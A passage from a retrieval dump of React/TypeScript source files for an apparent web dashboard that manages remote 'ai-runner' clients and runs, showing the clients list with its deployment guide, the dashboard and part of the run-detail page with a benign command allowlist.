'./wrapper/ai-runner start --run-id <id> --token <token>',\n    ],\n  },\n};\n\nexport function Clients({ user: _user }: Props) {\n  const { addToast } = useToast();\n  const [searchParams, setSearchParams] = useSearchParams();\n\n  // State\n  const [clients, setClients] = useState<Client[]>([]);\n  const [total, setTotal] = useState(0);\n  const [loading, setLoading] = useState(true);\n  const [loadingMore, setLoadingMore] = useState(false);\n  const [selectedOS, setSelectedOS] = useState<OSType>('windows');\n  const [showDeploymentGuide, setShowDeploymentGuide] = useState(false);\n\n  // Filters from URL\n  const status = searchParams.get('status') || 'all';\n  const search = searchParams.get('search') || '';\n\n  // Update URL params\n  const updateFilter = useCallback((key: string, value: string) => {\n    const newParams = new URLSearchParams(searchParams);\n    if (value && value !== 'all') {\n      newParams.set(key, value);\n    } else {\n      newParams.delete(key);\n    }\n    setSearchParams(newParams);\n  }, [searchParams, setSearchParams]);\n\n  // Fetch clients\n  const fetchClients = useCallback(async (append = false) => {\n    const offset = append ? clients.length : 0;\n    const params = new URLSearchParams();\n\n    if (status !== 'all') params.set('status', status);\n    if (search) params.set('search', search);\n    params.set('limit', '20');\n    params.set('offset', String(offset));\n\n    try {\n      append ? setLoadingMore(true) : setLoading(true);\n      const res = await fetch(`/api/clients?${params}`);\n      if (res.ok) {\n        const data: ClientsResponse = await res.json();\n        if (append) {\n          setClients(prev => [...prev, ...data.clients]);\n        } else {\n          setClients(data.clients);\n        }\n        setTotal(data.total);\n      }\n    } catch (err) {\n      console.error('Failed to fetch clients:', err);\n      addToast('error', 'Failed to load clients');\n    } finally {\n      setLoading(false);\n      setLoadingMore(false);\n    }\n  }, [status, search, clients.length, addToast]);\n\n  // Initial fetch\n  useEffect(() => {\n    fetchClients();\n  }, [status, search]);\n\n  // Auto-refresh\n  useEffect(() => {\n    const interval = setInterval(() => {\n      fetchClients();\n    }, 15000);\n    return () => clearInterval(interval);\n  }, [fetchClients]);\n\n  // Reset filters\n  const resetFilters = () => {\n    setSearchParams(new URLSearchParams());\n  };\n\n  // Check if any filters are active\n  const hasActiveFilters = status !== 'all' || !!search;\n\n  // Load more\n  const loadMore = () => {\n    fetchClients(true);\n  };\n\n  // Stats\n  const onlineCount = clients.filter(c => c.status === 'online').length;\n  const offlineCount = clients.filter(c => c.status === 'offline').length;\n\n  return (\n    <div className=\"clients-page\">\n      {/* Header */}\n      <div className=\"page-header\">\n        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>\n          <div>\n            <h2 className=\"page-title\">Clients</h2>\n            <div\n              style={{\n                display: 'flex',", "metadata": {"file": "ui/src/pages/Clients.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Clients.tsx", "location": "ui/src/pages/Clients.tsx:201", "score": 0.0, "content": "                gap: '12px',\n                fontSize: '13px',\n                color: 'var(--text-secondary)',\n              }}\n            >\n              <span style={{ color: 'var(--accent-green)' }}>\n                \u25cf {onlineCount} online\n              </span>\n              <span style={{ color: 'var(--accent-red)' }}>\n                \u25cb {offlineCount} offline\n              </span>\n            </div>\n          </div>\n          <button\n            className={`btn ${showDeploymentGuide ? 'btn-primary' : ''}`}\n            onClick={() => setShowDeploymentGuide(!showDeploymentGuide)}\n            style={{ whiteSpace: 'nowrap' }}\n          >\n            {showDeploymentGuide ? '\u2713 Deployment Guide' : 'Deployment Guide'}\n          </button>\n        </div>\n      </div>\n\n      {/* Deployment Guide Section */}\n      {showDeploymentGuide && (\n        <div\n          style={{\n            marginBottom: '20px',\n            padding: '20px',\n            background: 'var(--bg-secondary)',\n            border: '1px solid var(--border-color)',\n            borderRadius: '8px',\n          }}\n        >\n          <h3 style={{ marginTop: 0, marginBottom: '16px', fontSize: '16px', fontWeight: '600' }}>\n            Deployment Instructions\n          </h3>\n\n          {/* OS Selection Tabs */}\n          <div\n            style={{\n              display: 'flex',\n              gap: '8px',\n              marginBottom: '16px',\n              borderBottom: '1px solid var(--border-color)',\n            }}\n          >\n            {(['windows', 'macos', 'linux'] as OSType[]).map((os) => (\n              <button\n                key={os}\n                onClick={() => setSelectedOS(os)}\n                style={{\n                  padding: '10px 16px',\n                  background: 'transparent',\n                  border: 'none',\n                  borderBottom: selectedOS === os ? '2px solid var(--accent-blue)' : 'none',\n                  color: selectedOS === os ? 'var(--accent-blue)' : 'var(--text-secondary)',\n                  cursor: 'pointer',\n                  fontSize: '14px',\n                  fontWeight: selectedOS === os ? '600' : '400',\n                  transition: 'all 0.2s ease',\n                }}\n              >\n                {os === 'windows' ? '\ud83e\ude9f Windows' : os === 'macos' ? '\ud83c\udf4e macOS' : '\ud83d\udc27 Linux'}\n              </button>\n            ))}\n          </div>\n\n          {/* Instructions Content */}\n          <div style={{ paddingBottom: '16px' }}>\n            <h4 style={{ marginTop: 0, marginBottom: '12px', fontSize: '14px', fontWeight: '600' }}>\n              {deploymentInstructions[selectedOS].title}\n            </h4>\n\n            <div style={{ marginBottom: '16px' }}>\n              <h5 style={{ marginTop: 0, marginBottom: '8px', fontSize: '13px', color: 'var(--text-secondary)' }}>\n                Steps:\n              </h5>\n              <ol\n                style={{\n                  margin: 0,\n                  paddingLeft: '20px',\n                  fontSize: '13px',\n                  lineHeight: '1.6',\n                  color: 'var(--text-secondary)',\n                }}\n              >\n                {deploymentInstructions[selectedOS].steps.map((step, idx) => (\n                  <li key={idx} style={{ marginBottom: '6px' }}>\n                    {step}\n                  </li>\n                ))}\n              </ol>\n            </div>\n\n            <div>\n              <h5 style={{ marginTop: 0, marginBottom: '8px', fontSize: '13px', color: 'var(--text-secondary)' }}>\n                Commands:\n              </h5>\n              <div\n                style={{\n                  background: 'var(--bg-tertiary)',\n                  padding: '12px',\n                  borderRadius: '6px',\n                  overflow: 'auto',\n                  fontSize: '12px',\n                  fontFamily: 'monospace',\n                  color: 'var(--text-primary)',\n                  lineHeight: '1.6',\n                }}\n              >\n                {deploymentInstructions[selectedOS].commands.map((cmd, idx) => (\n                  <div key={idx} style={{ marginBottom: idx === deploymentInstructions[selectedOS].commands.length - 1 ? 0 : '6px' }}>\n                    {cmd.startsWith('#') ? (\n                      <span style={{ color: 'var(--text-secondary)', fontStyle: 'italic' }}>{cmd}</span>\n                    ) : (\n                      <span>$ {cmd}</span>\n                    )}\n                  </div>\n                ))}\n              </div>\n            </div>\n\n            <div\n              style={{\n                marginTop: '16px',\n                padding: '12px',\n                background: 'var(--bg-tertiary)',\n                borderRadius: '6px',\n                fontSize: '12px',\n                color: 'var(--text-secondary)',\n                borderLeft: '3px solid var(--accent-blue)',\n              }}\n            >\n              <strong>\ud83d\udca1 Tip:</strong> Once the gateway is running, create a run from the UI, then use the provided run-id and token to connect clients.\n            </div>\n          </div>\n        </div>\n      )}\n\n      {/* Filters */}\n      <FilterBar hasActiveFilters={hasActiveFilters} onReset={resetFilters}>\n        <SearchInput\n          value={search}\n          onChange={(val) => updateFilter('search', val)}\n          placeholder=\"Search clients...\"\n        />\n        <FilterSelect\n          label=\"Status\"\n          value={status}\n          options={statusOptions}\n          onChange={(val) => updateFilter('status', val)}\n        />\n      </FilterBar>\n\n      {/* Results count */}\n      <div\n        style={{\n          fontSize: '13px',\n          color: 'var(--text-muted)',\n          marginBottom: '12px',\n        }}\n      >\n        {loading ? 'Loading...' : `${total} clients found`}\n      </div>\n\n      {/* Clients list */}\n      {loading ? (\n        <div className=\"loading\">\n          <div className=\"spinner\" />\n        </div>\n      ) : clients.length === 0 ? (\n        <div className=\"empty-state\">\n          <h2>No clients found</h2>\n          <p>\n            {hasActiveFilters\n              ? 'Try adjusting your filters.'\n              : 'Clients will appear here when they connect to the gateway.'}\n          </p>\n          <div\n            style={{\n              marginTop: '16px',\n              padding: '16px',\n              background: 'var(--bg-secondary)',\n              borderRadius: '8px',\n              fontSize: '13px',\n              color: 'var(--text-secondary)',\n            }}\n          >\n            <p style={{ marginBottom: '12px' }}>\n              <strong>To get started:</strong>\n            </p>\n            <ol style={{ margin: '0 0 12px 20px', paddingLeft: 0 }}>\n              <li style={{ marginBottom: '6px' }}>\n                <button\n                  onClick={() => setShowDeploymentGuide(true)}\n                  style={{\n                    background: 'transparent',\n                    border: 'none',\n                    color: 'var(--accent-blue)',", "metadata": {"file": "ui/src/pages/Clients.tsx", "start_line": 201, "end_line": 400, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Clients.tsx", "location": "ui/src/pages/Clients.tsx:401", "score": 0.0, "content": "                    cursor: 'pointer',\n                    textDecoration: 'underline',\n                    fontSize: '13px',\n                    padding: 0,\n                  }}\n                >\n                  Follow the deployment guide\n                </button>\n                {' '}for your operating system\n              </li>\n              <li style={{ marginBottom: '6px' }}>Create a run from the Runs page to get a run-id and token</li>\n              <li>Connect a client using the command below</li>\n            </ol>\n            <p style={{ marginBottom: '8px', marginTop: '12px' }}>\n              <strong>Connect a client:</strong>\n            </p>\n            <code style={{ display: 'block', padding: '8px', background: 'var(--bg-tertiary)', borderRadius: '4px' }}>\n              ai-runner start --run-id [id] --token [token]\n            </code>\n          </div>\n        </div>\n      ) : (\n        <>\n          <div className=\"client-list\">\n            {clients.map((client) => (\n              <ClientCard key={client.id} client={client} />\n            ))}\n          </div>\n\n          {/* Load more */}\n          {clients.length < total && (\n            <div style={{ textAlign: 'center', marginTop: '16px' }}>\n              <button\n                className=\"btn\"\n                onClick={loadMore}\n                disabled={loadingMore}\n              >\n                {loadingMore ? 'Loading...' : `Load More (${clients.length}/${total})`}\n              </button>\n            </div>\n          )}\n        </>\n      )}\n    </div>\n  );\n}\n\nexport default Clients;", "metadata": {"file": "ui/src/pages/Clients.tsx", "start_line": 401, "end_line": 448, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Dashboard.tsx", "location": "ui/src/pages/Dashboard.tsx:1", "score": 0.0, "content": "import { useState, useEffect } from 'react';\nimport { useNavigate } from 'react-router-dom';\nimport { StatusPill, RunCard, type Run } from '../components/ui';\n\ninterface NeedsAttention {\n  waitingApproval: Run[];\n  failedRuns: Run[];\n  disconnectedWithRuns: {\n    id: string;\n    display_name: string;\n    last_seen_at: number;\n    status: string;\n    active_runs: number;\n  }[];\n  unacknowledgedAlerts: {\n    id: string;\n    type: string;\n    severity: string;\n    title: string;\n    message: string | null;\n    created_at: number;\n  }[];\n  counts: {\n    waitingApproval: number;\n    failedRuns: number;\n    disconnectedWithRuns: number;\n    unacknowledgedAlerts: number;\n  };\n}\n\ninterface ActivityItem {\n  type: 'run_event' | 'command' | 'artifact';\n  id: string;\n  timestamp: number;\n  data: any;\n}\n\ninterface DashboardStats {\n  runs: {\n    total: number;\n    running: number;\n    pending: number;\n    done: number;\n    failed: number;\n  };\n  clients: {\n    total: number;\n    online: number;\n    offline: number;\n  };\n  alerts: {\n    unacknowledged: number;\n  };\n  todayEvents: number;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nfunction formatRelativeTime(timestamp: number): string {\n  const now = Math.floor(Date.now() / 1000);\n  const diff = now - timestamp;\n\n  if (diff < 60) return 'just now';\n  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;\n  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;\n  return `${Math.floor(diff / 86400)}d ago`;\n}\n\nexport function Dashboard({ user: _user }: Props) {\n  const navigate = useNavigate();\n  const [needsAttention, setNeedsAttention] = useState<NeedsAttention | null>(null);\n  const [activeRuns, setActiveRuns] = useState<Run[]>([]);\n  const [activity, setActivity] = useState<ActivityItem[]>([]);\n  const [stats, setStats] = useState<DashboardStats | null>(null);\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    fetchDashboardData();\n    const interval = setInterval(fetchDashboardData, 10000);\n    return () => clearInterval(interval);\n  }, []);\n\n  async function fetchDashboardData() {\n    try {\n      const [attentionRes, runsRes, activityRes, statsRes] = await Promise.all([\n        fetch('/api/dashboard/needs-attention'),\n        fetch('/api/dashboard/active-runs?limit=8'),\n        fetch('/api/dashboard/activity?limit=20'),\n        fetch('/api/dashboard/stats'),\n      ]);\n\n      if (attentionRes.ok) {\n        setNeedsAttention(await attentionRes.json());\n      }\n      if (runsRes.ok) {\n        setActiveRuns(await runsRes.json());\n      }\n      if (activityRes.ok) {\n        setActivity(await activityRes.json());\n      }\n      if (statsRes.ok) {\n        setStats(await statsRes.json());\n      }\n    } catch (err) {\n      console.error('Failed to fetch dashboard data:', err);\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  if (loading) {\n    return (\n      <div className=\"loading\">\n        <div className=\"spinner\" />\n      </div>\n    );\n  }\n\n  const totalAttention = needsAttention\n    ? needsAttention.counts.waitingApproval +\n      needsAttention.counts.failedRuns +\n      needsAttention.counts.disconnectedWithRuns\n    : 0;\n\n  return (\n    <div className=\"dashboard\">\n      {/* Stats row */}\n      {stats && (\n        <div className=\"stats-grid\">\n          <div className=\"stat-card\">\n            <div className=\"stat-value\">{stats.runs.running}</div>\n            <div className=\"stat-label\">Running</div>\n          </div>\n          <div className=\"stat-card\">\n            <div className=\"stat-value\">{stats.clients.online}</div>\n            <div className=\"stat-label\">Clients Online</div>\n          </div>\n          <div className=\"stat-card\">\n            <div className=\"stat-value\" style={{ color: totalAttention > 0 ? 'var(--accent-red)' : undefined }}>\n              {totalAttention}\n            </div>\n            <div className=\"stat-label\">Need Attention</div>\n          </div>\n          <div className=\"stat-card\">\n            <div className=\"stat-value\">{stats.todayEvents}</div>\n            <div className=\"stat-label\">Events Today</div>\n          </div>\n        </div>\n      )}\n\n      {/* Needs Attention Section */}\n      {totalAttention > 0 && (\n        <section className=\"dashboard-section\">\n          <h2 className=\"section-title\">\n            <span style={{ color: 'var(--accent-red)' }}>\u26a0</span> Needs Attention\n          </h2>\n\n          {/* Waiting Approval */}\n          {needsAttention && needsAttention.waitingApproval.length > 0 && (\n            <div className=\"attention-group\">\n              <h3 className=\"attention-title\">\n                <span className=\"attention-badge\" style={{ background: 'var(--accent-purple)' }}>\n                  {needsAttention.waitingApproval.length}\n                </span>\n                Waiting Approval\n              </h3>\n              <div className=\"attention-items\">\n                {needsAttention.waitingApproval.slice(0, 3).map((run) => (\n                  <RunCard key={run.id} run={run as Run} compact />\n                ))}\n                {needsAttention.waitingApproval.length > 3 && (\n                  <button\n                    className=\"btn btn-sm\"\n                    onClick={() => navigate('/runs?waitingApproval=true')}\n                  >\n                    View all {needsAttention.waitingApproval.length} waiting\n                  </button>\n                )}\n              </div>\n            </div>\n          )}\n\n          {/* Failed Runs */}\n          {needsAttention && needsAttention.failedRuns.length > 0 && (\n            <div className=\"attention-group\">\n              <h3 className=\"attention-title\">\n                <span className=\"attention-badge\" style={{ background: 'var(--accent-red)' }}>\n                  {needsAttention.failedRuns.length}\n                </span>\n                Failed Runs (24h)\n              </h3>\n              <div className=\"attention-items\">\n                {needsAttention.failedRuns.slice(0, 3).map((run) => (\n                  <RunCard key={run.id} run={run as Run} compact />\n                ))}\n                {needsAttention.failedRuns.length > 3 && (\n                  <button\n                    className=\"btn btn-sm\"", "metadata": {"file": "ui/src/pages/Dashboard.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/Dashboard.tsx", "location": "ui/src/pages/Dashboard.tsx:201", "score": 0.0, "content": "                    onClick={() => navigate('/runs?status=failed')}\n                  >\n                    View all {needsAttention.failedRuns.length} failed\n                  </button>\n                )}\n              </div>\n            </div>\n          )}\n\n          {/* Disconnected Clients */}\n          {needsAttention && needsAttention.disconnectedWithRuns.length > 0 && (\n            <div className=\"attention-group\">\n              <h3 className=\"attention-title\">\n                <span className=\"attention-badge\" style={{ background: 'var(--accent-yellow)' }}>\n                  {needsAttention.disconnectedWithRuns.length}\n                </span>\n                Clients Offline with Active Runs\n              </h3>\n              <div className=\"attention-items\">\n                {needsAttention.disconnectedWithRuns.map((client) => (\n                  <div\n                    key={client.id}\n                    className=\"attention-item\"\n                    onClick={() => navigate(`/clients/${client.id}`)}\n                    style={{ cursor: 'pointer' }}\n                  >\n                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>\n                      <StatusPill status=\"offline\" size=\"sm\" />\n                      <span>{client.display_name}</span>\n                    </div>\n                    <span style={{ color: 'var(--text-muted)', fontSize: '12px' }}>\n                      {client.active_runs} active runs\n                    </span>\n                  </div>\n                ))}\n              </div>\n            </div>\n          )}\n        </section>\n      )}\n\n      {/* Active Runs Section */}\n      <section className=\"dashboard-section\">\n        <div className=\"section-header\">\n          <h2 className=\"section-title\">Active Runs</h2>\n          <button className=\"btn btn-sm\" onClick={() => navigate('/runs')}>\n            View All\n          </button>\n        </div>\n\n        {activeRuns.length === 0 ? (\n          <div className=\"empty-state-small\">\n            No active runs at the moment.\n          </div>\n        ) : (\n          <div className=\"run-list\">\n            {activeRuns.map((run) => (\n              <RunCard key={run.id} run={run as Run} />\n            ))}\n          </div>\n        )}\n      </section>\n\n      {/* Recent Activity Section */}\n      <section className=\"dashboard-section\">\n        <div className=\"section-header\">\n          <h2 className=\"section-title\">Recent Activity</h2>\n        </div>\n\n        {activity.length === 0 ? (\n          <div className=\"empty-state-small\">\n            No recent activity.\n          </div>\n        ) : (\n          <div className=\"activity-list\">\n            {activity.map((item) => (\n              <ActivityListItem key={item.id} item={item} />\n            ))}\n          </div>\n        )}\n      </section>\n    </div>\n  );\n}\n\nfunction ActivityListItem({ item }: { item: ActivityItem }) {\n  const navigate = useNavigate();\n\n  const getActivityContent = () => {\n    switch (item.type) {\n      case 'run_event':\n        try {\n          const eventData = JSON.parse(item.data.eventData || '{}');\n          const eventName = eventData.event?.toUpperCase() || 'EVENT';\n          return {\n            icon: eventName === 'STARTED' ? '\u25b6' : eventName === 'FINISHED' ? '\u2713' : '\u2022',\n            text: `Run ${eventName.toLowerCase()}`,\n            subtext: item.data.runLabel || item.data.runId,\n            color: eventName === 'FINISHED' && eventData.exitCode === 0\n              ? 'var(--accent-green)'\n              : eventName === 'FINISHED'\n                ? 'var(--accent-red)'\n                : 'var(--accent-blue)',\n            onClick: () => navigate(`/runs/${item.data.runId}`),\n          };\n        } catch {\n          return {\n            icon: '\u2022',\n            text: 'Run event',\n            subtext: item.data.runId,\n            color: 'var(--text-secondary)',\n            onClick: () => navigate(`/runs/${item.data.runId}`),\n          };\n        }\n\n      case 'command':\n        return {\n          icon: '\u2318',\n          text: item.data.status === 'completed' ? 'Command completed' : 'Command queued',\n          subtext: item.data.command,\n          color: item.data.status === 'completed' ? 'var(--accent-green)' : 'var(--accent-yellow)',\n          onClick: () => navigate(`/runs/${item.data.runId}`),\n        };\n\n      case 'artifact':\n        return {\n          icon: '\ud83d\udcce',\n          text: 'Artifact uploaded',\n          subtext: item.data.name,\n          color: 'var(--accent-blue)',\n          onClick: () => navigate(`/runs/${item.data.runId}`),\n        };\n\n      default:\n        return {\n          icon: '\u2022',\n          text: 'Activity',\n          subtext: '',\n          color: 'var(--text-secondary)',\n          onClick: () => {},\n        };\n    }\n  };\n\n  const content = getActivityContent();\n\n  return (\n    <div\n      className=\"activity-item\"\n      onClick={content.onClick}\n      style={{ cursor: 'pointer' }}\n    >\n      <span\n        style={{\n          width: '24px',\n          textAlign: 'center',\n          color: content.color,\n          flexShrink: 0,\n        }}\n      >\n        {content.icon}\n      </span>\n      <div style={{ flex: 1, minWidth: 0 }}>\n        <div style={{ fontSize: '13px' }}>{content.text}</div>\n        <div\n          style={{\n            fontSize: '12px',\n            color: 'var(--text-muted)',\n            overflow: 'hidden',\n            textOverflow: 'ellipsis',\n            whiteSpace: 'nowrap',\n          }}\n        >\n          {content.subtext}\n        </div>\n      </div>\n      <span style={{ fontSize: '11px', color: 'var(--text-muted)', flexShrink: 0 }}>\n        {formatRelativeTime(item.timestamp)}\n      </span>\n    </div>\n  );\n}\n\nexport default Dashboard;", "metadata": {"file": "ui/src/pages/Dashboard.tsx", "start_line": 201, "end_line": 384, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/index.ts", "location": "ui/src/pages/index.ts:1", "score": 0.0, "content": "export { Dashboard } from './Dashboard';\nexport { Runs } from './Runs';\nexport { RunDetail } from './RunDetail';\nexport { Clients } from './Clients';\nexport { ClientDetailPage } from './ClientDetail';\nexport { Alerts } from './Alerts';\nexport { Settings } from './Settings';", "metadata": {"file": "ui/src/pages/index.ts", "start_line": 1, "end_line": 7, "language": "ts"}}, {"corpus": "code", "source": "ui/src/pages/RunDetail.tsx", "location": "ui/src/pages/RunDetail.tsx:1", "score": 0.0, "content": "import { useState, useEffect, useRef, useCallback } from 'react';\nimport { useParams, Link, useNavigate } from 'react-router-dom';\nimport {\n  StatusPill,\n  ConnectionIndicator,\n  LiveLogViewer,\n  Modal,\n  ConfirmModal,\n  useToast,\n  type LogEvent,\n} from '../components/ui';\n\ninterface Run {\n  id: string;\n  status: string;\n  label: string | null;\n  command: string | null;\n  repo_path: string | null;\n  repo_name: string | null;\n  client_id: string | null;\n  client_name: string | null;\n  client_status: string | null;\n  waiting_approval: number;\n  created_at: number;\n  started_at: number | null;\n  finished_at: number | null;\n  exit_code: number | null;\n  error_message: string | null;\n  artifacts: Artifact[];\n  commands: Command[];\n  assistUrl: string | null;\n  duration: number | null;\n}\n\ninterface Artifact {\n  id: string;\n  name: string;\n  type: string;\n  size: number;\n  created_at: number;\n}\n\ninterface Command {\n  id: string;\n  command: string;\n  status: string;\n  created_at: number;\n  acked_at: number | null;\n  result: string | null;\n  error: string | null;\n}\n\ninterface Props {\n  user: { id: string; username: string; role: string } | null;\n}\n\nconst ALLOWED_COMMANDS = [\n  'npm test',\n  'npm run build',\n  'npm run lint',\n  'git diff',\n  'git status',\n  'git log --oneline -10',\n  // Directory navigation\n  'cd',\n  'ls',\n  'ls -la',\n  'ls -l',\n  'ls -a',\n  'll',\n  'dir',\n  'pwd',\n];\n\ntype Tab = 'log' | 'timeline' | 'artifacts' | 'commands';\n\nfunction formatDuration(seconds: number): string {\n  if (seconds < 60) return `${seconds}s`;\n  if (seconds < 3600) return `${Math.floor(seconds / 60)}m ${seconds % 60}s`;\n  const hours = Math.floor(seconds / 3600);\n  const mins = Math.floor((seconds % 3600) / 60);\n  return `${hours}h ${mins}m`;\n}\n\nfunction formatBytes(bytes: number): string {\n  if (bytes < 1024) return `${bytes} B`;\n  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;\n  return `${(bytes / (1024 * 1024)).toFixed(1)} MB`;\n}\n\nfunction formatTime(timestamp: number): string {\n  return new Date(timestamp * 1000).toLocaleString();\n}\n\nexport function RunDetail({ user }: Props) {\n  const { runId } = useParams<{ runId: string }>();\n  const navigate = useNavigate();\n  const { addToast } = useToast();\n\n  // State\n  const [run, setRun] = useState<Run | null>(null);\n  const [events, setEvents] = useState<LogEvent[]>([]);\n  const [loading, setLoading] = useState(true);\n  const [connected, setConnected] = useState(false);\n  const [reconnecting, setReconnecting] = useState(false);\n  const [activeTab, setActiveTab] = useState<Tab>('log');\n\n  // Prompt waiting state\n  const [promptWaiting, setPromptWaiting] = useState(false);\n  const [promptText, setPromptText] = useState('');\n  const [keyboardInput, setKeyboardInput] = useState('');\n  const [keyboardHistory, setKeyboardHistory] = useState<string[]>([]);\n  const [historyIndex, setHistoryIndex] = useState(-1);\n  const [sendLoading, setSendLoading] = useState(false);\n\n  // Modals\n  const [showCommandModal, setShowCommandModal] = useState(false);\n  const [selectedCommand, setSelectedCommand] = useState('');\n  const [showPromptModal, setShowPromptModal] = useState(false);\n  const [promptInput, setPromptInput] = useState('');\n  const [showStopConfirm, setShowStopConfirm] = useState(false);\n  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);\n  const [commandLoading, setCommandLoading] = useState(false);\n  const [promptLoading, setPromptLoading] = useState(false);\n  const [deleteLoading, setDeleteLoading] = useState(false);\n  const [showActionMenu, setShowActionMenu] = useState(false);\n  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);\n\n  // Detect mobile/responsive changes\n  useEffect(() => {\n    const handleResize = () => setIsMobile(window.innerWidth < 768);\n    window.addEventListener('resize', handleResize);\n    return () => window.removeEventListener('resize', handleResize);\n  }, []);\n\n  // Refs\n  const wsRef = useRef<WebSocket | null>(null);\n  const lastEventId = useRef(0);\n  const reconnectTimeout = useRef<NodeJS.Timeout>();\n  const keyboardInputRef = useRef<HTMLInputElement>(null);\n\n  const canOperate = user?.role === 'admin' || user?.role === 'operator';\n  const canDelete = user?.role === 'admin';\n  const isActive = run?.status === 'running';\n\n  // Fetch run details\n  const fetchRun = useCallback(async () => {\n    try {\n      const res = await fetch(`/api/runs/${runId}`);\n      if (res.ok) {\n        const data = await res.json();\n        setRun(data);\n      } else if (res.status === 404) {\n        navigate('/runs', { replace: true });\n        addToast('error', 'Run not found');\n      }\n    } catch (err) {\n      console.error('Failed to fetch run:', err);\n    } finally {\n      setLoading(false);\n    }\n  }, [runId, navigate, addToast]);\n\n  // Fetch events\n  const fetchEvents = useCallback(async () => {\n    try {\n      const res = await fetch(`/api/runs/${runId}/events?after=${lastEventId.current}&limit=500`);\n      if (res.ok) {\n        const newEvents = await res.json();\n        if (newEvents.length > 0) {\n          setEvents(prev => [...prev, ...newEvents]);\n          lastEventId.current = newEvents[newEvents.length - 1].id;\n        }\n      }\n    } catch (err) {\n      console.error('Failed to fetch events:', err);\n    }\n  }, [runId]);\n\n  // Connect WebSocket\n  const connectWebSocket = useCallback(() => {\n    if (wsRef.current?.readyState === WebSocket.OPEN) return;\n\n    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';\n    const ws = new WebSocket(`${protocol}//${window.location.host}/ws`);\n\n    ws.onopen = () => {\n      setConnected(true);\n      setReconnecting(false);\n      ws.send(JSON.stringify({ type: 'subscribe', runId }));\n    };\n\n    ws.onmessage = (msg) => {\n      try {\n        const data = JSON.parse(msg.data);\n        switch (data.type) {\n          case 'event':\n            setEvents(prev => [\n              ...prev,\n              {", "metadata": {"file": "ui/src/pages/RunDetail.tsx", "start_line": 1, "end_line": 200, "language": "tsx"}}, {"corpus": "code", "source": "ui/src/pages/RunDetail.tsx", "location": "ui/src/pages/RunDetail.tsx:201", "score": 0.0, "content": "                id: data.eventId,\n                type: data.eventType,\n                data: data.data,\n                timestamp: data.timestamp,\n              },\n            ]);\n            lastEventId.current = data.eventId;\n\n            // Handle prompt events\n            if (data.eventType === 'prompt_waiting') {\n              setPromptWaiting(true);\n              setPromptText(data.data);\n              // Focus keyboard input\n              setTimeout(() => keyboardInputRef.current?.focus(), 100);\n            } else if (data.eventType === 'prompt_resolved') {\n              setPromptWaiting(false);\n              setPromptText('');\n            }\n            break;\n\n          case 'command_completed':\n          case 'artifact_uploaded':\n            fetchRun();\n            break;\n        }\n      } catch {\n        // Ignore parse errors\n      }\n    };\n\n    ws.onclose = () => {\n      setConnected(false);\n      setReconnecting(true);\n      // Reconnect with backoff\n      reconnectTimeout.current = setTimeout(connectWebSocket, 3000);\n    };\n\n    ws.onerror = () => {\n      setConnected(false);\n    };\n\n    wsRef.current = ws;\n  }, [runId, fetchRun]);\n\n  // Initial fetch and WebSocket setup\n  useEffect(() => {\n    fetchRun();\n    fetchEvents();\n    connectWebSocket();\n\n    return () => {\n      if (wsRef.current) {\n        wsRef.current.close();\n      }\n      if (reconnectTimeout.current) {\n        clearTimeout(reconnectTimeout.current);\n      }\n    };\n  }, [runId]);\n\n  // Send command\n  const sendCommand = async () => {\n    if (!selectedCommand) return;\n\n    setCommandLoading(true);\n    try {\n      const res = await fetch(`/api/runs/${runId}/command`, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ command: selectedCommand }),\n      });\n      if (res.ok) {\n        addToast('success', 'Command queued');\n        setShowCommandModal(false);\n        setSelectedCommand('');\n        fetchRun();\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to send command');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to send command');\n    } finally {\n      setCommandLoading(false);\n    }\n  };\n\n  // Send prompt/input\n  const sendPrompt = async () => {\n    if (!promptInput.trim()) return;\n\n    setPromptLoading(true);\n    try {\n      const res = await fetch(`/api/runs/${runId}/input`, {\n        method: 'POST',\n        headers: { 'Content-Type': 'application/json' },\n        body: JSON.stringify({ input: promptInput + '\\n', escape: false }),\n      });\n      if (res.ok) {\n        addToast('success', 'Prompt sent');\n        setShowPromptModal(false);\n        setPromptInput('');\n        fetchRun();\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to send prompt');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to send prompt');\n    } finally {\n      setPromptLoading(false);\n    }\n  };\n\n  // Stop run\n  const stopRun = async () => {\n    try {\n      const res = await fetch(`/api/runs/${runId}/stop`, { method: 'POST' });\n      if (res.ok) {\n        addToast('success', 'Stop requested');\n        setShowStopConfirm(false);\n        fetchRun();\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to stop run');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to stop run');\n    }\n  };\n\n  // Delete run\n  const deleteRun = async () => {\n    setDeleteLoading(true);\n    try {\n      const res = await fetch(`/api/runs/${runId}`, { method: 'DELETE' });\n      if (res.ok) {\n        addToast('success', 'Run deleted successfully');\n        setShowDeleteConfirm(false);\n        navigate('/runs', { replace: true });\n      } else {\n        const error = await res.json();\n        addToast('error', error.error || 'Failed to delete run');\n      }\n    } catch (err) {\n      addToast('error', 'Failed to delete run');\n    } finally {\n      setDeleteLoading(false);\n    }\n  };\n\n  // Send keyboard input\n  const sendKeyboardInput = async () => {\n    if (!keyboardInput.trim()) return;\n\n    setSendLoading(true);\n    const input = keyboardInput + '\\n'; // Always append newline\n\n    try {\n      const res = await fetch(`/api/runs/${runId}/input`, {\n        method: 'POST',\n        headers: 